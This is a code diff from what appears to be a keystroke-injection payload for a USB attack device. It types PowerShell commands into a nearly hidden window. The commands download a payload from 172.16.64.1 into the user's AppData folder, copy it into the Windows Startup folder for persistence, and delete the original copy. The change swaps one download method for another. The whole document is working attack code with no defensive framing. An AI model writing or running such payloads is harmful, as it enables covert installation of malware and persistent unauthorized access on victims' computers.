@@ -29,7 +29,7 @@ QUACK DELAY 300
 QUACK STRING "powershell.exe -NoExit -Command \"[console]::WindowHeight=1; [console]::WindowWidth=10\""
 QUACK ENTER
 QUACK DELAY 300
-QUACK STRING "Invoke-WebRequest -Uri \"http://172.16.64.1/<Payload_Name>/\" -OutFile \"\$env:APPDATA\\<Payload_Name>\"; if (\$?) { Write-Host \"Success!\" -ForegroundColor Green; Start-Sleep -Seconds 1 } else { Write-Host \"Fail\" -ForegroundColor Red; Start-Sleep -Seconds 1}"
+QUACK STRING "(New-Object Net.WebClient).DownloadFile(\"http://172.16.64.1/<Payload_Name>/\", \"\$env:APPDATA\\<Payload_Name>\"); if (\$?) { Write-Host \"Success!\" -ForegroundColor Green; Start-Sleep -Seconds 1 } else { Write-Host \"Fail\" -ForegroundColor Red; Start-Sleep -Seconds 1}"
 QUACK ENTER
 QUACK DELAY 300
 QUACK STRING "Copy-Item -Path \"\$env:APPDATA\\<Payload_Name>\" -Destination \"\$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" -Force; if (\$?) { Write-Host \"Success!\" -ForegroundColor Green; Start-Sleep -Seconds 1; Remove-Item -Path \"\$env:APPDATA\\<Payload_Name>\"; exit } else { Write-Host \"Fail\" -ForegroundColor Red; Start-Sleep -Seconds 1; Remove-Item -Path \"\$env:APPDATA\\<Payload_Name>\"; exit }"
